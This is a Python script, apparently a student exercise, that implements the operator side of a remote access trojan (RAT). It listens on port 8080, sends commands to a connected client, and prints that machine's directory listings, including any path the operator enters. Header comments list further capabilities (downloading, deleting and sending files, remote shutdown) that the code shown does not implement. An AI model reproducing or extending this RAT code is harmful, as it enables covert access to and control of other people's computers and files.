# Meet👻(17IT064) * Access files remotely (RAT)

# Gain access to different directories

# View Files

# Download Files

# Remove Files

# Remove Directories

# Send Files

# Create Directory

# shut down remotely

import os
import socket

s=socket.socket()
host=socket.gethostname()
port=8080
s.bind((host,port))
print("")
print("Server is currently running @", host)
print("")
print("Waiting for incoming connections....")

s.listen(1)
conn, addr = s.accept()
print("")
print(addr, "Has connected to the server successfully")

while 1:
    command = input (str("Command >> "))
    if command == "view cwd":
        conn.send (command.encode () )
        print ("")
        print ("Command sent waiting for execution... ")
        print ("")
        conn.recv (1024)
        print ("Command has been executed successfully")
        files = conn.recv (5000)
        files = files.decode()
        print ("Command output : ", files)

    elif command == "custom_dir":
            conn.send (command.encode ())
            print ("")
            user_input = input (str ("Custom Dir : "))
            conn.send (user_input.encode () )
            print ("")
            print ("Command has been sent")
            print ("")
            files = conn.recv (5000)
            files = files.decode ()
            print ("Custom Dir Result : ", files)

    else:
        print ("")
        print ("Command not recognised")
